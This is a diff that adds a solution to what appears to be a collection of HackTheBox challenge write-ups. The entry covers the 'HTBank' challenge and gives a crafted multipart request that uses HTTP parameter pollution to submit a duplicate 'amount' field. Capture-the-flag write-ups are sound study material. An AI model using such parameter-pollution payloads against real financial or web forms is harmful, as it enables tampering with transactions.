@@ -106,3 +106,28 @@ Reminder for encoding :
    }
    	```
 - Explanation: https://medium.com/@tanish.saxena26/hackthebox-jscalc-95c0435c849d
+
+**10 HTBank:**
+- Link: https://app.hackthebox.com/challenges/htbank
+- Hint: HTTP Parameter Pollution.
+- SolutionL:
+- 	In a request just add one more amount parameter with value of 1337.
+		  ```
+		  -----------------------------372602692120017375223068472451
+			Content-Disposition: form-data; name="account"
+			
+			0x038f3bed54d3d0ed704fff0bede93ae2
+			-----------------------------372602692120017375223068472451
+			Content-Disposition: form-data; name="amount"
+			
+			0
+			
+			-----------------------------372602692120017375223068472451
+			Content-Disposition: form-data; name="amount"
+			
+			1337
+			-----------------------------372602692120017375223068472451--
+		  ```
+  -	after that, the ending of the request will be like this, and in response, you will get "OK".
+  -	now refresh the page.
+- Explanation: Watch any parameter pollution video/writeUP.
